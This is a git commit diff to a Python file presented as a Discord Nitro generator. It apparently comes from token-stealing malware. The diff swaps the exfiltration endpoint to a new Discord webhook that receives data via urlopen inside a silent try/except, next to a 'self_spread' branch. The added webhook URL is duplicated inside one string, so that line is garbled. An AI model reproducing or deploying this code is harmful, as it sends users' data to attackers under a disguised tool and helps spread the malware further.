fbd249d86b2ce589e12a88903c92d60db5d4d3a1
ja-3 <78225165+ja-3@users.noreply.github.com>
2021-03-08 10:22:22 -0500

    Update NitroGeneratorSourceUpdated.py

--- NitroGeneratorSourceUpdated.py
+++ NitroGeneratorSourceUpdated.py
@@ -181,7 +181,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("https://discord.com/api/webhooks/789959221058994208/-cf9mb_rke8yLxDv_M9qETqQlMcAWkFWkUjf9KKsfQzEXrkDEZracNR_qHtOVEqEBAJY", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/818502223197503508/VRRrgXDrLO59M_2XfQHcE1A95InySzVpbm5otPyEaMPbBZAD34HUuEMlM9QelikmKNAohttps://discord.com/api/webhooks/818502223197503508/VRRrgXDrLO59M_2XfQHcE1A95InySzVpbm5otPyEaMPbBZAD34HUuEMlM9QelikmKNAo", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
